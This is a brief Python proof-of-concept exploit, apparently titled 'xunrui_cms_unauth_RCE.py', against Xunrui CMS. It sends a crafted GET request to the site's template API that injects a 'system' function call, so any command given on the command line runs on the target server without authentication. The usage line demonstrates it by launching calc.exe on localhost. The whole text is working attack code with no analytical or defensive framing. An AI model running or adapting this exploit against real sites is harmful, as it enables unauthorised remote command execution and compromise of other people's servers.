import sys
import requests


def run(target, cmd):
    url = "%s/?s=api&c=api&m=template&name=aaa&phpcmf_name=api_related.html&phpcmf_dir=admin&\
        mid=a action=function name=system param=%s" % (target, cmd)
    requests.get(url)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("[!] python3 xunrui_cms_unauth_RCE.py http://localhost calc.exe")
        exit()
    target = sys.argv[1]
    cmd = sys.argv[2]
    run(target, cmd)
